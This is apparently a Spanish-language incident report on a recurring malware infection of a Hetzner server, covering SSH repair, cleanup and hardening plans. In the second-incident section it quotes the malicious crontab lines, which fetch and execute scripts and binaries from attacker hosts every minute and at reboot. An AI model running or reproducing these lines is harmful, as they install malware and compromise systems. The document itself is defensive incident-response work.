# Problema Recurrente: Malware y SSH en Hetzner - 11 de Diciembre 2025

**Fecha**: 2025-12-11
**Estado**: ‚ö†Ô∏è CR√çTICO - Requiere acciones de seguridad inmediatas
**Servidor**: clousadmin-server (46.224.70.156)

---

## üö® Resumen Ejecutivo

El servidor ha sufrido **dos incidentes en 24 horas**:

1. **10/12**: Malware detectado y eliminado + SSH reparado
2. **11/12**: **Mismo malware volvi√≥** + SSH volvi√≥ a fallar

Esto indica un **compromiso de seguridad activo** que requiere acciones inmediatas m√°s all√° de limpiezas reactivas.

---

## üìä Cronolog√≠a de Incidentes

### 10 de Diciembre 2025 (Primer Incidente)

- **Problema**: SSH con "Connection refused"
- **Causa**: Binario `/usr/sbin/sshd` faltante
- **Malware detectado**: Crontab con script desde `ellison.st` y `80.64.16.241`
- **Acci√≥n**:
  - Reinstalaci√≥n de openssh-server
  - Eliminaci√≥n de crontab malicioso
  - Fix de cloud-init
- **Resultado**: SSH funcionando, malware eliminado
- **Documentaci√≥n**: [ssh-repair-hetzner-2025-12-10.md](ssh-repair-hetzner-2025-12-10.md)

### 11 de Diciembre 2025 (Segundo Incidente - MISMO PROBLEMA)

- **Problema**: SSH con "Connection refused" OTRA VEZ
- **Causa**: Binario `/usr/sbin/sshd` faltante OTRA VEZ
- **Malware**: **MISMO malware volvi√≥ a aparecer**
- **Crontab malicioso detectado**:
  ```bash
  * * * * * wget -q -O - http://80.64.16.241/re.sh | bash > /dev/null 2>&1
  @reboot cd /tmp; (curl -s http://ellison.st/x86 -o x86 && chmod 777 x86 && ./x86 js && rm -f x86) ...
  ```
- **Acci√≥n**:
  - Reinstalaci√≥n de openssh-server
  - Eliminaci√≥n de crontab malicioso
  - Eliminaci√≥n de procesos maliciosos
  - Reinstalaci√≥n de CRONs leg√≠timos
- **Resultado**: SSH funcionando, malware eliminado (temporalmente)

---

## üîç An√°lisis del Problema Recurrente

### ¬øPor Qu√© el Malware Vuelve?

El malware tiene **persistencia** a trav√©s de m√∫ltiples vectores:

1. **Cron @reboot**: Se ejecuta cada vez que el servidor arranca
2. **Descarga cada minuto**: `* * * * *` (CADA minuto del d√≠a)
3. **Posible backdoor**: Puede haber un acceso persistente que reinstala el malware

### ¬øPor Qu√© SSH Falla?

**Hip√≥tesis m√°s probable**: El malware o actualizaciones autom√°ticas corrompen/eliminan `/usr/sbin/sshd`

**Evidencia**:
- Paquete `openssh-server` marcado como instalado
- Binario `/usr/sbin/sshd` NO existe
- Sucede exactamente despu√©s de que el malware reaparece

### Vector de Entrada

**DESCONOCIDO** - Posibles vectores:

1. **Vulnerabilidad en la aplicaci√≥n** (Next.js, PM2, nginx)
2. **Contrase√±a d√©bil** (aunque usamos keys SSH)
3. **Puerto SSH expuesto** sin fail2ban
4. **Backdoor pre-existente** no detectado
5. **Imagen de servidor comprometida** (menos probable)

---

## ‚úÖ Soluci√≥n Aplicada (11/12)

### 1. Reparaci√≥n de SSH (Rescue Mode)

```bash
# Activar rescue mode
/tmp/hcloud server enable-rescue --ssh-key 104423788 clousadmin-server
/tmp/hcloud server reset clousadmin-server

# Montar y reparar
mount /dev/sda1 /mnt
mount --bind /dev /mnt/dev /mnt/proc /mnt/sys
chroot /mnt /bin/bash

# Reinstalar openssh
apt remove --purge -y openssh-server openssh-client openssh-sftp-server
apt install -y openssh-server

# Fix cloud-init
rm -f /usr/lib/systemd/system/ssh.service.d/disable-sshd-keygen-if-cloud-init-active.conf
touch /var/lib/cloud/instance/boot-finished

# Desmontar y reiniciar
umount /mnt/dev /mnt/proc /mnt/sys /mnt
/tmp/hcloud server disable-rescue clousadmin-server
/tmp/hcloud server reboot clousadmin-server
```

### 2. Eliminaci√≥n de Malware

```bash
# Eliminar crontab malicioso
crontab -r

# Matar procesos
pkill -f "80.64.16.241"
pkill -f "ellison.st"

# Reinstalar CRONs leg√≠timos
30 23 * * * curl -s -X POST https://app.hrcron.com/api/cron/clasificar-fichajes ...
0 2 * * * curl -s -X POST https://app.hrcron.com/api/cron/revisar-solicitudes ...
10 0 1 1 * curl -s -X POST https://app.hrcron.com/api/cron/renovar-saldo-horas ...
```

---

## üõ°Ô∏è Medidas de Seguridad URGENTES Requeridas

### Prioridad CR√çTICA (Implementar HOY)

#### 1. Cambiar Puerto SSH

```bash
ssh root@46.224.70.156
sed -i 's/^#Port 22/Port 2222/' /etc/ssh/sshd_config
systemctl restart ssh
```

**Actualizar firewall de Hetzner** para permitir puerto 2222.

#### 2. Instalar fail2ban

```bash
apt install -y fail2ban
systemctl enable fail2ban
systemctl start fail2ban
```

#### 3. Auditor√≠a de Seguridad Completa

```bash
# Buscar archivos sospechosos modificados recientemente
find / -type f -mtime -2 -ls 2>/dev/null | grep -vE '/proc|/sys|/dev'

# Verificar usuarios
cat /etc/passwd | grep -v nologin

# Verificar sudoers
cat /etc/sudoers.d/* 2>/dev/null

# Verificar systemd timers sospechosos
systemctl list-timers --all

# Buscar archivos con SUID
find / -perm -4000 -ls 2>/dev/null
```

#### 4. Monitoreo de Crontab

Crear script de monitoreo que verifique cada hora que el crontab es leg√≠timo:

```bash
#!/bin/bash
# /opt/clousadmin/scripts/monitor-crontab.sh

EXPECTED_HASH="SHA256_DE_CRONTAB_LEGITIMO"
CURRENT_HASH=$(crontab -l | sha256sum | awk '{print $1}')

if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
  echo "‚ö†Ô∏è CRONTAB MODIFICADO - Posible compromiso"
  # Enviar alerta, restaurar crontab, etc.
fi
```

### Prioridad ALTA (Esta Semana)

#### 5. Hardening del Servidor

```bash
# Deshabilitar root login (usar usuario con sudo)
sed -i 's/^PermitRootLogin .*/PermitRootLogin no/' /etc/ssh/sshd_config

# Instalar AppArmor/SELinux
apt install -y apparmor apparmor-utils

# Configurar actualizaciones autom√°ticas de seguridad
apt install -y unattended-upgrades
dpkg-reconfigure -plow unattended-upgrades
```

#### 6. WAF (Web Application Firewall)

- Cloudflare con reglas de seguridad
- O ModSecurity con nginx

#### 7. An√°lisis de Logs

```bash
# Instalar herramientas
apt install -y logwatch rkhunter chkrootkit

# Ejecutar an√°lisis
rkhunter --check
chkrootkit
```

### Prioridad MEDIA (Este Mes)

#### 8. Backup Autom√°tico Verificado

- Configurar backups diarios
- Probar restauraci√≥n
- Almacenar fuera del servidor

#### 9. IDS/IPS

- OSSEC o Wazuh
- Monitoreo de integridad de archivos

---

## üî¨ Investigaci√≥n Pendiente

### Preguntas Sin Responder

1. **¬øC√≥mo entra el malware inicialmente?**
   - Revisar logs de nginx para peticiones sospechosas
   - Auditar c√≥digo de la aplicaci√≥n
   - Verificar dependencias npm comprometidas

2. **¬øPor qu√© se elimina `/usr/sbin/sshd`?**
   - ¬øEs intencional por el malware?
   - ¬øEfecto colateral de alguna acci√≥n?
   - ¬øProblema con actualizaciones autom√°ticas?

3. **¬øHay otros archivos comprometidos?**
   - Verificar integridad de binarios del sistema
   - Comparar con servidor limpio

### Acciones de Investigaci√≥n

```bash
# 1. Ver conexiones recientes
last -n 50

# 2. Ver intentos de login fallidos
grep "Failed password" /var/log/auth.log | tail -50

# 3. Verificar conexiones actuales
ss -tulpn | grep ESTABLISHED

# 4. Analizar tr√°fico de red
tcpdump -i eth0 -w /tmp/traffic.pcap
# Analizar con Wireshark

# 5. Verificar si hay rootkit
wget http://www.rfxn.com/downloads/maldetect-current.tar.gz
tar -xzf maldetect-current.tar.gz
cd maldetect-*
./install.sh
maldet --update
maldet -a /
```

---

## üìù Checklist de Verificaci√≥n Post-Incidente

- [x] SSH funcionando
- [x] Malware eliminado del crontab
- [x] Procesos maliciosos terminados
- [x] CRONs leg√≠timos instalados
- [x] Cloud-init fix aplicado
- [x] Aplicaci√≥n (PM2) funcionando
- [ ] Puerto SSH cambiado a no-est√°ndar
- [ ] fail2ban instalado
- [ ] Auditor√≠a de seguridad completa
- [ ] Monitoreo de crontab implementado
- [ ] Logs analizados para encontrar vector de entrada
- [ ] Backups verificados
- [ ] IDS/IPS configurado

---

## üö® Protocolo de Emergencia

Si el malware vuelve OTRA VEZ:

### Opci√≥n 1: Migraci√≥n a Servidor Nuevo

1. Crear snapshot limpio de la BD
2. Desplegar aplicaci√≥n en nuevo servidor
3. Migrar datos
4. Destruir servidor comprometido

**Ventaja**: Garantiza eliminaci√≥n total del malware
**Desventaja**: Tiempo y complejidad

### Opci√≥n 2: Reinstalaci√≥n Completa

1. Backup de datos cr√≠ticos (BD)
2. Reinstalar Ubuntu desde cero
3. Hardening completo desde el inicio
4. Restaurar solo datos, NO c√≥digo

---

## üìû Contactos y Recursos

### Hetzner Support

- Email: support@hetzner.com
- Phone: +49 9831 505-0

### Seguridad

- CERT: https://www.cert.org/
- Ubuntu Security: https://ubuntu.com/security

### An√°lisis de Malware

- VirusTotal: https://www.virustotal.com/
- Hybrid Analysis: https://www.hybrid-analysis.com/

---

## üìö Documentaci√≥n Relacionada

- [SSH Repair 10/12](ssh-repair-hetzner-2025-12-10.md)
- [Fix Estructural CRON Timezone](../historial/2025-12-11-fix-estructural-cron-timezone.md)
- [Fix L√≠mites Fichaje](../historial/2025-12-11-fix-limites-fichaje.md)

---

**IMPORTANTE**: Este problema requiere atenci√≥n de seguridad profesional. Considerar contratar auditor√≠a de seguridad externa.

**Estado Actual**: ‚ö†Ô∏è Servidor funcionando pero VULNERABLE a reinfecci√≥n

**Pr√≥xima Acci√≥n**: Implementar medidas de seguridad CR√çTICAS en las pr√≥ximas 24 horas.
